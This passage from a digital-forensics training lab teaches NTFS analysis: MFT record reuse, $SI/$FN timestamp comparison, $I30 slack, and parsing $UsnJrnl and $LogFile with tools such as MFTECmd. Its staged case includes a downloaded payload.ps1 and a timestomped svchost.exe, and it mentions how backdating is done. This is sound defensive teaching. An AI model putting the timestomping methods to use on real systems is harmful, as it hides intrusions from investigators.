- LSN 0: on Windows this links the record to `$LogFile`; ntfs-3g doesn't journal.

Now a deleted record, and the record reuse that destroyed `notes.txt`:

```bash
python3 ~/DFIR/scripts/mft_record.py work/MFT 83 | head -n 6
python3 ~/DFIR/scripts/mft_record.py work/MFT 73 | grep -E 'Sequence|Name  |Created|Record changed'
```

```
FILE record 83
  $LogFile sequence number (LSN): 0
  Sequence number               : 2   (bumped each time the record is reused)
  Hard link count               : 0
  Flags                         : 0x0000 = NOT IN USE (deleted)
  Used / allocated size         : 392 / 1024 bytes
  Sequence number               : 2   (bumped each time the record is reused)
      $SI Created        : 2019-03-14 10:00:00.0000000
      $SI Record changed : 2026-09-29 01:20:44.9031551
      Name            : svchost.exe   (namespace POSIX)
      $FN Created        : 2019-03-14 10:00:00.0000000
      $FN Record changed : 2026-09-29 01:20:44.9031551
```

Record 83 (`spec-10.txt`) is deleted but intact: in-use flag clear, sequence 2. Record 73 is the interesting one. Its sequence is 2, so **another file used it before**: that was `notes.txt`, deleted at 01:02:03. ntfs-3g gave the freed record to `svchost.exe` 18 minutes later, and `notes.txt`'s name, times and resident content are gone from the $MFT. Notice also that `svchost.exe` claims to be from 2019 **in both `$SI` and `$FN`** (a full stomp), but sits in a record that was free yesterday, with a record-changed time of 2026-09-29.

### Lab 3: Parse the $MFT with MFTECmd (25 min)

```bash
mftecmd -f work/MFT --csv work/mftecmd --csvf mft.csv > /dev/null
python3 - work/mftecmd/mft.csv <<'EOF'
import csv, sys
rows = list(csv.DictReader(open(sys.argv[1], encoding="utf-8-sig")))
print(f"{len(rows)} rows")
print("\nDeleted (InUse = False):")
for r in rows:
    if r["InUse"] == "False" and r["FileName"]:
        print(f"  entry {r['EntryNumber']:>3} seq {r['SequenceNumber']}  {r['ParentPath']}\\{r['FileName']}")
print("\nTimestamps of interest ($SI = 0x10, $FN = 0x30; blank 0x30 = same as 0x10):")
for r in rows:
    if r["FileName"] in ("payload.ps1", "svchost.exe", "Q3-forecast.xlsx"):
        print(f"  {r['FileName']} (entry {r['EntryNumber']}-{r['SequenceNumber']})  SI<FN={r['SI<FN']}  uSecZeros={r['uSecZeros']}")
        for k in ("Created", "LastModified", "LastRecordChange", "LastAccess"):
            print(f"    {k + '0x10':<20} {r[k + '0x10']:<28} {k + '0x30':<20} {r[k + '0x30']}")
print("\nAlternate data streams:")
for r in rows:
    if r["IsAds"] == "True":
        print(f"  {r['ParentPath']}\\{r['FileName']}  ({r['FileSize']} bytes)")
        if r["ZoneIdContents"]:
            print("    " + r["ZoneIdContents"].replace("\r", "").strip().replace("\n", " | "))
EOF
```

```
70 rows

Deleted (InUse = False):
  entry  83 seq 2  .\Users\alice\Documents\Projects\spec-10.txt
  entry  84 seq 2  .\Users\alice\Documents\Projects\spec-11.txt
  entry  85 seq 2  .\Users\alice\Documents\Projects\spec-12.txt
  entry  86 seq 2  .\Users\alice\Documents\Projects\spec-13.txt
  entry  87 seq 2  .\Users\alice\Documents\Projects\spec-14.txt
  entry  88 seq 2  .\Users\alice\Documents\Projects\spec-15.txt
  entry  89 seq 2  .\Users\alice\Documents\Projects\spec-16.txt
  entry  90 seq 2  .\Users\alice\Documents\Projects\spec-17.txt
  entry  91 seq 2  .\Users\alice\Documents\Projects\spec-18.txt
  entry  92 seq 2  .\Users\alice\Documents\Projects\spec-19.txt

Timestamps of interest ($SI = 0x10, $FN = 0x30; blank 0x30 = same as 0x10):
  Q3-forecast.xlsx (entry 72-1)  SI<FN=False  uSecZeros=False
    Created0x10          2026-09-28 09:15:00.4372815  Created0x30          
    LastModified0x10     2026-09-28 09:15:00.4372815  LastModified0x30     
    LastRecordChange0x10 2026-09-29 01:02:03.1180043  LastRecordChange0x30 2026-09-28 09:15:00.4372815
    LastAccess0x10       2026-09-28 09:15:00.4372815  LastAccess0x30       
  svchost.exe (entry 73-2)  SI<FN=False  uSecZeros=True
    Created0x10          2019-03-14 10:00:00.0000000  Created0x30          
    LastModified0x10     2019-03-14 10:00:00.0000000  LastModified0x30     
    LastRecordChange0x10 2026-09-29 01:20:44.9031551  LastRecordChange0x30 
    LastAccess0x10       2019-03-14 10:00:00.0000000  LastAccess0x30       
  payload.ps1 (entry 114-1)  SI<FN=False  uSecZeros=True
    Created0x10          2026-09-29 01:02:03.1180043  Created0x30          
    LastModified0x10     2019-03-14 10:00:00.0000000  LastModified0x30     2026-09-29 01:02:03.1180043
    LastRecordChange0x10 2026-09-29 01:20:44.9031551  LastRecordChange0x30 2026-09-29 01:02:03.1180043
    LastAccess0x10       2019-03-14 10:00:00.0000000  LastAccess0x30       2026-09-29 01:02:03.1180043

Alternate data streams:
  .\$BadClus:$Bad  (33550336 bytes)
  .\$Secure:$SDS  (262396 bytes)
  .\$UpCase:$Info  (32 bytes)
  .\Users\alice\Downloads\payload.ps1:Zone.Identifier  (67 bytes)
    [ZoneTransfer] | ZoneId=3 | HostUrl=http://203.0.113.50/payload.ps1
```

How to read the three files:

| File | What the times say |
|---|---|
| `Q3-forecast.xlsx` | Content and creation unchanged since 09-28; `$SI` record-changed jumped to 01:02:03 while `$FN` kept 09-28. That's what a **rename** looks like (§1.3) |
| `payload.ps1` | **`SI<FN` is False**, because only created is compared, and the created times were never touched. But `$SI` modified (2019) is earlier than `$FN` modified (2026), and `uSecZeros` is True. **Backdated with a tool that set M and A** (here `touch`, like PowerShell's `.LastWriteTime`) |
| `svchost.exe` | Both `$SI` and `$FN` say 2019, so **no $SI/$FN mismatch at all**. What gives it away: whole-second times (`uSecZeros`), a record-changed time of 2026-09-29 01:20:44, and record `73-2`, a recycled entry |

The lesson: `SI<FN = False` doesn't mean "not timestomped". Read all eight times.

Dump the record details with MFTECmd itself, and recover the deleted files' resident content:

```bash
mftecmd -f work/MFT --de 73 2>&1 | sed -n '/STANDARD INFO/,/SECURITY DESCRIPTOR/p'
mftecmd -f work/MFT --csv work/mftecmd --csvf mft-dr.csv --dr > /dev/null
ls work/mftecmd/Resident | grep -E '^(83|84|73)-'
cat work/mftecmd/Resident/83-2-2_spec-10.txt.bin
```

```
**** STANDARD INFO ****
  Flags: Archive, Max Version: 0x0, Flags 2: None, Class Id: 0x0, Owner Id: 0x0, Security Id: 0x0, Quota charged: 0x0, Update sequence #: 0x0
  Created On:         2019-03-14 10:00:00.0000000
  Modified On:        2019-03-14 10:00:00.0000000
  Record Modified On: 2026-09-29 01:20:44.9031551
  Last Accessed On:   2019-03-14 10:00:00.0000000
**** FILE NAME ****
  Flags: Archive, Name Type: Posix, Reparse Value: 0x0, Physical Size: 0x18, Logical Size: 0x0
  Parent Entry-seq #: 0x47-0x1
  Created On:         2019-03-14 10:00:00.0000000
  Modified On:        2019-03-14 10:00:00.0000000
  Record Modified On: 2026-09-29 01:20:44.9031551
  Last Accessed On:   2019-03-14 10:00:00.0000000
**** SECURITY DESCRIPTOR ****
73-2-2_svchost.exe.bin
83-2-2_spec-10.txt.bin
84-2-2_spec-11.txt.bin
project file 10
```

(Right after `SECURITY DESCRIPTOR`, version 2026.5.0 stops with an `OverflowException` on this ntfs-3g image; see the MFTECmd troubleshooting table. The `sed` range hides it.) `--dr` wrote the content of every resident file, **deleted ones included**: `spec-10.txt` is recovered from its old MFT record.

Finally, a timeline of the night. MFTECmd writes a bodyfile; `mactime` (The Sleuth Kit) sorts it:

```bash
mftecmd -f work/MFT --body work/mftecmd --bodyf mft.body --bdl C > /dev/null
mactime -b work/mftecmd/mft.body -d -z UTC 2026-09-29 2> /dev/null | cut -d, -f1,3,7,8
```

```
Date,Type,Meta,File Name
Tue Sep 29 2026 01:02:03,...b,114-128-2,"c:/Users/alice/Downloads/payload.ps1"
Tue Sep 29 2026 01:02:03,...b,114-128-4,"c:/Users/alice/Downloads/payload.ps1:Zone.Identifier"
Tue Sep 29 2026 01:02:03,macb,114-48-3,"c:/Users/alice/Downloads/payload.ps1 ($FILE_NAME)"
Tue Sep 29 2026 01:02:03,m.c.,66-144-0,"c:/Users/alice/Documents"
Tue Sep 29 2026 01:02:03,m.c.,67-144-0,"c:/Users/alice/Documents/Projects"
Tue Sep 29 2026 01:02:03,m.c.,68-144-0,"c:/Users/alice/Downloads"
Tue Sep 29 2026 01:02:03,..c.,72-128-2,"c:/Users/alice/Documents/Q3-forecast.xlsx"
Tue Sep 29 2026 01:20:44,..c.,114-128-2,"c:/Users/alice/Downloads/payload.ps1"
Tue Sep 29 2026 01:20:44,..c.,114-128-4,"c:/Users/alice/Downloads/payload.ps1:Zone.Identifier"
Tue Sep 29 2026 01:20:44,m.c.,71-144-0,"c:/Users/alice/AppData/Local/Temp"
Tue Sep 29 2026 01:20:44,..c.,73-128-2,"c:/Users/alice/AppData/Local/Temp/svchost.exe"
Tue Sep 29 2026 01:20:44,..c.,73-48-3,"c:/Users/alice/AppData/Local/Temp/svchost.exe ($FILE_NAME)"
```

Even with both files backdated, the **c** (record changed) times put them in the 01:20 activity, and `Temp`'s **m** time at 01:20:44 shows something was added there. Directory times are evidence too: `Documents` and `Projects` changed at 01:02:03, when the deletions and the rename happened.

### Lab 4: Recover deleted names from $I30 slack (10 min)

```bash
istat evidence/case10.img 67 | grep -E 'INDEX_ALLOCATION'
icat evidence/case10.img 67-160-5 > work/Projects_I30
xxd work/Projects_I30 | head -n 1
mftecmd -f work/Projects_I30 --csv work/mftecmd --csvf i30.csv | grep -E 'contains'
python3 - work/mftecmd/i30.csv <<'EOF'
import csv, sys
rows = list(csv.DictReader(open(sys.argv[1], encoding="utf-8-sig")))
active = {r["FileName"] for r in rows if r["FromSlack"] == "False"}
slack = [r["FileName"] for r in rows if r["FromSlack"] == "True"]
print("slack entries:", len(slack), "| names found only in slack:", sorted(set(slack) - active))
EOF
fls evidence/case10.img 67 | grep -E 'spec-(19|20)'
```

```
Type: $INDEX_ALLOCATION (160-5)   Name: $I30   Non-Resident   size: 8192  init_size: 8192
00000000: 494e 4458 2800 0900 0000 0000 0000 0000  INDX(...........
$I30 contains 29 active and 20 slack entries
slack entries: 20 | names found only in slack: ['spec-19.txt', 'spec-20.txt']
r/r 93-128-2:	spec-20.txt
-/r * 92-128-2:	spec-19.txt
```

Twenty slack entries, but most are **stale copies** of entries that were shifted when ten names were removed. Comparing with the active entries leaves two names. `fls` settles them: `spec-19.txt` is deleted (genuine slack evidence), while `spec-20.txt` is alive; it lives in the **index root** (resident in the directory's record), which this INDX file doesn't include. On a real system, where the deleted file's MFT record has already been reused, a name in `$I30` slack (with its `$FN` times) may be the only proof the file existed in that folder.

### Lab 5: Validate with analyzeMFT (15 min)

```bash
analyzemft -f work/MFT -o work/amft.csv --csv 2> /dev/null
analyzemft -f work/MFT -o work/amft.db --sqlite 2> /dev/null
python3 - work/amft.csv work/amft.db <<'EOF'
import csv, sqlite3, sys
rows = list(csv.DictReader(open(sys.argv[1], encoding="utf-8", errors="replace")))
print("CSV rows:", len(rows), "| rows with a Filepath:", sum(1 for r in rows if r["Filepath"]))
db = sqlite3.connect(sys.argv[2])
print("SQLite rows under \\Users:", db.execute("SELECT count(*) FROM mft_records WHERE filepath LIKE '\\Users%'").fetchone()[0],
      "| rows with an SI creation time:", db.execute("SELECT count(*) FROM mft_records WHERE si_creation_time IS NOT NULL").fetchone()[0])
paths = dict(db.execute("SELECT record_number, filepath FROM mft_records"))
print("\nDeleted files (Record Type = Not in Use), paths joined from the SQLite export:")
for r in rows:
    if r["Record Type"] == "Not in Use" and r["Filename"]:
        print(f"  {r['Record Number']:>3}  {paths.get(int(r['Record Number']))}")
print("\nSI modified earlier than FN modified (backdating):")
for r in rows:
    si, fn = r["SI Modification Time"], r["FN Modification Time"]
    if si[:1].isdigit() and fn[:1].isdigit() and si < fn:
        print(f"  {r['Record Number']:>3}  {paths.get(int(r['Record Number']))}  SI {si}  FN {fn}")
EOF
```

```
CSV rows: 107 | rows with a Filepath: 0
SQLite rows under \Users: 51 | rows with an SI creation time: 0

Deleted files (Record Type = Not in Use), paths joined from the SQLite export:
   83  \Users\alice\Documents\Projects\spec-10.txt
   84  \Users\alice\Documents\Projects\spec-11.txt
   85  \Users\alice\Documents\Projects\spec-12.txt
   86  \Users\alice\Documents\Projects\spec-13.txt
   87  \Users\alice\Documents\Projects\spec-14.txt
   88  \Users\alice\Documents\Projects\spec-15.txt
   89  \Users\alice\Documents\Projects\spec-16.txt
   90  \Users\alice\Documents\Projects\spec-17.txt
   91  \Users\alice\Documents\Projects\spec-18.txt
   92  \Users\alice\Documents\Projects\spec-19.txt

SI modified earlier than FN modified (backdating):
  114  \Users\alice\Downloads\payload.ps1  SI 2019-03-14T10:00:00.000Z  FN 2026-09-29T01:02:03.118Z
```

The two parsers **agree**: the same ten deleted files, the same backdated `payload.ps1` (and, like MFTECmd's `SI<FN`, no simple $SI/$FN comparison catches the fully stomped `svchost.exe`). Along the way you found two real problems in analyzeMFT 3.1.1: the CSV has no paths and the SQLite export has no times. Joining them on the record number works around both. Note the times: `.118Z` is milliseconds; MFTECmd gives `.1180043`.

### Lab 6: A real $UsnJrnl:$J (20 min)

These samples come from the dfir_ntfs project's public test data (GPL-3.0), recorded on Windows 10. The journal comes with `fsutil`'s own dump of it as a reference.

```bash
cd ~/cases/LAB-010/samples
for f in usnjrnlj.bin usnjrnlj.fsutil.txt LogFile_10.bin; do
  curl -sSfL -o "$f" "https://raw.githubusercontent.com/msuhanov/dfir_ntfs/master/test_data/$f"
done
sha256sum usnjrnlj.bin LogFile_10.bin | tee ../notes/samples.sha256
python3 ~/DFIR/scripts/usn_peek.py usnjrnlj.bin --summary
python3 ~/DFIR/scripts/usn_peek.py usnjrnlj.bin | head -n 5
python3 ~/DFIR/scripts/usn_peek.py usnjrnlj.bin | grep -E 'Rename'
```

```
5026fd52dd18c80fe48284876c34ad9dad8c4b894c6caed6aecca92e7c3f9453  usnjrnlj.bin
a3e908923404ae806f755fb223a62b2838ca59a38eca49a32c1cb17ada6220c5  LogFile_10.bin
Records by version: V2: 264, V4: 7
Bytes skipped as not-a-record: 0
Records by reason flag:
     199  FileCreate
     128  BasicInfoChange
     104  Close
      32  DataExtend
      31  DataOverwrite
      24  ObjectIdChange
       8  RenameNewName
       4  RenameOldName
       3  DataTruncation
Offset	USN	Timestamp(UTC)	Entry-Seq	Parent	Reasons	Name
0	0	2019-01-22 21:36:10.9243619	40-1	5-5	FileCreate	New folder
80	80	2019-01-22 21:36:10.9243619	40-1	5-5	FileCreate|Close	New folder
160	160	2019-01-22 21:36:11.0493034	41-1	5-5	FileCreate	$RECYCLE.BIN
248	248	2019-01-22 21:36:11.0493034	41-1	5-5	FileCreate|Close	$RECYCLE.BIN
1736	1736	2019-01-22 21:36:13.8153681	40-1	5-5	RenameOldName	New folder
1816	1816	2019-01-22 21:36:13.8153681	40-1	5-5	RenameNewName	test_dir
1896	1896	2019-01-22 21:36:13.8153681	40-1	5-5	RenameNewName|Close	test_dir
2408	2408	2019-01-22 21:36:22.2997119	44-1	40-1	RenameOldName	New Text Document.txt
2512	2512	2019-01-22 21:36:22.2997119	44-1	40-1	RenameNewName	test_file_1.txt
2608	2608	2019-01-22 21:36:22.3153345	44-1	40-1	RenameNewName|Close	test_file_1.txt
2896	2896	2019-01-22 21:36:33.1121012	44-1	40-1	RenameOldName	test_file_1.txt
2992	2992	2019-01-22 21:36:33.1121012	44-1	40-1	RenameNewName	test_file_111.txt
3088	3088	2019-01-22 21:36:33.1121012	44-1	40-1	RenameNewName|Close	test_file_111.txt
9264	9264	2019-01-22 21:38:52.9950302	58-1	36-1	RenameOldName	tracking.log.tmp
9360	9360	2019-01-22 21:38:52.9950302	58-1	36-1	RenameNewName	tracking.log
9448	9448	2019-01-22 21:38:52.9950302	58-1	36-1	RenameNewName|Close	tracking.log
```

Read the renames as a story: someone right-clicked → New → Folder (`New folder`, entry 40), named it `test_dir`, created `New Text Document.txt` inside it (parent `40-1`), renamed it to `test_file_1.txt`, then to `test_file_111.txt`. The journal kept every intermediate name with 100-ns times. The $MFT would only show the final name. (Compare these lines with `usnjrnlj.fsutil.txt`, Windows' own decoding of the same journal.)

Now the validation step. Count what MFTECmd finds:

```bash
mftecmd -f usnjrnlj.bin --csv ../work/mftecmd --csvf j.csv | grep -E 'entries found'
python3 ~/DFIR/scripts/usn_peek.py usnjrnlj.bin | awk -F'\t' 'NR > 1 && $7 !~ /V4/' | wc -l
python3 ~/DFIR/scripts/usn_peek.py usnjrnlj.bin | awk -F'\t' '$7 ~ /V4/ {print $1}' | head -n 3
python3 - ../work/mftecmd/j.csv <<'EOF'
import csv, sys
got = {int(r["OffsetToData"]) for r in csv.DictReader(open(sys.argv[1], encoding="utf-8-sig"))}
print("MFTECmd records at offsets 8000-8700:", sorted(o for o in got if 8000 <= o <= 8700))
EOF
python3 ~/DFIR/scripts/usn_peek.py usnjrnlj.bin | awk -F'\t' '$1 >= 8000 && $1 <= 8700 {print $1, $6, $7}'
```

```
Usn entries found in usnjrnlj.bin: 179
264
8192
8464
15648
MFTECmd records at offsets 8000-8700: [8056]
8056 DataExtend test_file_111.txt
8192 DataExtend|Close (V4 range-tracking record)
8272 DataExtend|Close test_file_111.txt
8368 DataOverwrite test_file_111.txt
8464 DataOverwrite|Close (V4 range-tracking record)
8544 DataOverwrite|Close test_file_111.txt
8640 ObjectIdChange|Close .
```

MFTECmd reported **179** records; the journal holds **264** named records. (`fsutil`'s dump lists 261 of them: the journal file was copied a little later, after three more records had been written.) The first record MFTECmd misses comes right after the first **V4 range-tracking record** at offset 8192: after a V4 record it jumps to the next 4 KB page, and every named record in between is lost (85 in total). V4 records appear when range tracking is enabled (`fsutil usn enablerangetracking`). If you hadn't counted, you would have reported an incomplete history. **Always validate a parser's record count on an artifact you can check another way.**

### Lab 7: A real $LogFile (15 min)

First, the empty log from our ntfs-3g image, then the Windows 10 sample:

```bash
python3 ~/DFIR/scripts/logfile_peek.py ../work/LogFile
python3 ~/DFIR/scripts/logfile_peek.py LogFile_10.bin | head -n 12
python3 ~/DFIR/scripts/logfile_peek.py LogFile_10.bin | tail -n 6
```

```
No valid restart page (RSTR) found: is this a $LogFile? (an all-0xFF file is an empty log)
$LogFile: 212992 bytes, LFS version 2.0, log page size 4096, client 'NTFS'
Current LSN: 8413528 (file offset 0x30ac0), client restart LSN: 8413528, sequence-number bits: 43, log record pages (RCRD): 37
Log records found: 323 (12 client restart areas), LSN range 4218907..8413167
Records per lap (older laps are leftovers the log has not overwritten yet): lap 2: 84, lap 4: 239

Redo / undo operations:
    69  ForgetTransaction            / CompensationLogRecord
    29  UpdateResidentValue          / UpdateResidentValue
    27  UpdateNonresidentValue       / UpdateNonresidentValue
    26  SetNewAttributeSizes         / SetNewAttributeSizes
    16  AddIndexEntryAllocation      / DeleteIndexEntryAllocation
    16  Noop                         / Noop
  LSN    8410034 (lap 4)  AddIndexEntryRoot            desktop.ini
  LSN    8410058 (lap 4)  InitializeFileRecordSegment  desktop.ini
  LSN    8412197 (lap 4)  AddIndexEntryAllocation      find_me.txt
  LSN    8412221 (lap 4)  InitializeFileRecordSegment  find_me.txt
  LSN    8412418 (lap 4)  DeleteIndexEntryAllocation   find_me.txt
  LSN    8412493 (lap 4)  AddIndexEntryAllocation      got_renamed.txt
```

The log is circular: the "lap" (sequence number) tells you which pass wrote a record. Lap-4 records are the current window; lap-2 records are older leftovers that haven't been overwritten yet, and they are evidence too. (Checked against the dfir_ntfs parser: it reports 305 of these records, the 18 extra here being lap-2 leftovers it skips.)

Now zoom in on one transaction:

```bash
python3 ~/DFIR/scripts/logfile_peek.py LogFile_10.bin --records | awk '$1 >= 8412197 && $1 <= 8412520'
```

```
   8412197 lap=4 tx=24   AddIndexEntryAllocation      DeleteIndexEntryAllocation   find_me.txt
   8412221 lap=4 tx=24   InitializeFileRecordSegment  Noop                         find_me.txt
   8412269 lap=4 tx=24   ForgetTransaction            CompensationLogRecord        
   8412280 lap=4 tx=24   UpdateResidentValue          UpdateResidentValue          
   8412291 lap=4 tx=24   ForgetTransaction            CompensationLogRecord        
   8412302 lap=4 tx=24   UpdateResidentValue          UpdateResidentValue          
   8412325 lap=4 tx=24   UpdateFileNameAllocation     UpdateFileNameAllocation     
   8412350 lap=4 tx=24   ForgetTransaction            CompensationLogRecord        
   8412361 lap=4 tx=24   UpdateResidentValue          UpdateResidentValue          
   8412382 lap=4 tx=24   UpdateFileNameAllocation     UpdateFileNameAllocation     
   8412407 lap=4 tx=24   ForgetTransaction            CompensationLogRecord        
   8412418 lap=4 tx=24   DeleteIndexEntryAllocation   AddIndexEntryAllocation      find_me.txt
   8412442 lap=4 tx=24   DeleteAttribute              CreateAttribute              
   8412467 lap=4 tx=24   CreateAttribute              DeleteAttribute              
   8412493 lap=4 tx=24   AddIndexEntryAllocation      DeleteIndexEntryAllocation   got_renamed.txt
   8412518 lap=4 tx=24   ForgetTransaction            CompensationLogRecord        
```

Read it as NTFS did:

1. `find_me.txt` is **created**: an index entry is added to the parent directory (`AddIndexEntryAllocation`) and a new FILE record is initialised.
2. Its values are updated a few times (`UpdateResidentValue`, `UpdateFileNameAllocation`): content and `$SI` times.
3. It is **renamed**: the old index entry is deleted, the `$FILE_NAME` attribute is deleted and re-created, and a new index entry `got_renamed.txt` is added.

Each record carries both the redo (new) and undo (old) data, which is how NTFS Log Tracker shows "old value → new value" for names and timestamps. This file is not in the `$J` sample (they come from different test volumes); on a real case you would line up the same rename in `$J` (`RenameOldName` / `RenameNewName`) to get its time.

Before you finish, record in `notes/`: the image hash, the tool versions, and the two tool problems you found (MFTECmd and V4 records; analyzeMFT's exports). That's the kind of note that saves a report from being wrong.

---

## ✅ Knowledge check

1. What do entry `73` and sequence `2` tell you that entry `73` alone doesn't?
2. Why can a deleted file's *content* still be recovered from the $MFT, and when does that stop being possible?
3. Which set of timestamps does Explorer show, which set does it never show, and which set is harder to change?
4. `SI<FN` is False for a file whose `$SI` modified time is in 2019 and `$FN` modified time is in 2026. Is the file clean? Explain.
5. A file's `$SI` and `$FN` times all say 2019, with zero sub-seconds. What else would you check to show it's newer?
6. Where can a deleted file's name survive after its MFT record has been reused?
7. What does a `RenameOldName` / `RenameNewName` pair in `$J` show, and why can't the $MFT show it?
8. Why does `$LogFile` often contain information that `$J` doesn't, and vice versa?
9. MFTECmd reports 179 `$J` records. How did you find out that was wrong, and what's the general lesson?

<details>
<summary><b>Answers</b></summary>

1. The sequence number counts how often the entry has been reused. `73-2` means a different file used entry 73 before; any reference to `73-1` (in `$J`, an index entry or a LNK file) is that older file, not the current one.
2. Small files are **resident**: their content is inside the FILE record. Deleting a file only clears the in-use flag, so the content stays until the record is reused for another file.
3. Explorer shows `$STANDARD_INFORMATION` times (it shows created, modified and accessed; record-changed isn't shown). It doesn't show the four `$FILE_NAME` times. `$FN` is harder to change: user-mode APIs set `$SI`, and `$FN` changes only on creation and rename/move.
4. No. MFTECmd's `SI<FN` compares only the created times. A modified time in `$SI` earlier than in `$FN` is impossible in normal use and shows backdating of M (and A). `uSecZeros` points the same way.
5. The record-changed (`C`) time, the entry/sequence number (a recycled record or a high entry number), the parent directory's times, `$J` (`FileCreate` and `BasicInfoChange` records with real times), `$LogFile`, and other artifacts such as Prefetch, Amcache and event logs.
6. In the parent directory's `$I30` slack (with a copy of its `$FN` times), in `$UsnJrnl:$J`, in `$LogFile`, and in other artifacts such as LNK files and shellbags.
7. A rename (or move): the old name, then the new name and the new parent, with the time. The $MFT keeps only the current name (and `$FN` times are reset), so intermediate names are lost there.
8. `$LogFile` records low-level metadata operations with before/after values (including timestamp changes and resident data), but covers only a short window. `$J` records higher-level change reasons with timestamps over a much longer period but no before/after values. Neither is complete alone.
9. By counting the records with an independent parser (`usn_peek.py`) and Windows' own `fsutil` dump: 264, not 179. The missing records follow V4 range-tracking records. Lesson: validate every tool on data you can check, and say which tool and version produced each finding.

</details>

---

## 📚 Further reading

- Brian Carrier, *File System Forensic Analysis* (Addison-Wesley, 2005), chapters 11–13: NTFS concepts and data structures
- Microsoft Learn: *Master File Table (Local File Systems)*, *Change Journals*, `USN_RECORD_V2`/`V3`/`V4`, and `fsutil usn`
- Eric Zimmerman's MFTECmd blog posts (linked from the MFTECmd README), and the SANS FOR508 *Windows Forensic Analysis* poster for timestamp rules
- Junghoon Oh, *NTFS Log Tracker* (author's page) and the F-INSIGHT talk slides on `$LogFile` analysis
- Maxim Suhanov, dfir_ntfs documentation (https://github.com/msuhanov/dfir_ntfs) for `$LogFile` internals and test data
- MITRE ATT&CK T1070.006, *Indicator Removal: Timestomp*

---

## ⏭️ Tomorrow: Day 11

**Windows Registry fundamentals: hives, keys and transaction logs.** Tools: **Registry Explorer**, **RECmd**, **RegRipper**.
You'll open the hives your Day 9 collection copied, learn the regf format (bins, cells, keys, values), and see why a hive without its `.LOG1`/`.LOG2` files can be out of date, the registry's own version of today's `$LogFile` story.

---

<sub>Part of the <a href="../README.md">DFIR Daily</a> series · <a href="../CURRICULUM.md">Full 60-day curriculum</a> · For educational and authorised use only.</sub>
